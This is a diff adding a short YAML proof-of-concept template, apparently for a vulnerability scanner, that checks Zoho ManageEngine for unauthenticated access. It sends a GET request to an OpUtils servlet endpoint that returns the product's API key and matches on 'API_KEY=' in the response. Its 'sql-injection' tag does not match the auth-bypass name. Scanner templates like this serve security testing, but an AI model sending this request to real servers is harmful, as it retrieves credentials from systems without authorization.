@@ -1,0 +1,16 @@
+id: poc-yaml-zoho-manageengine-auth-bypass
+info:
+  name: Zoho ManageEngine 未授权访问漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: Zoho ManageEngine
+  osprey-id: vb_2019_0090
+requests:
+- method: GET
+  path: /oputilsServlet?action=getAPIKey
+  expression: 'contains(body, "API_KEY=") && contains(body, "SyncResult=")
+
+    '
+variables: {}
+transport: http
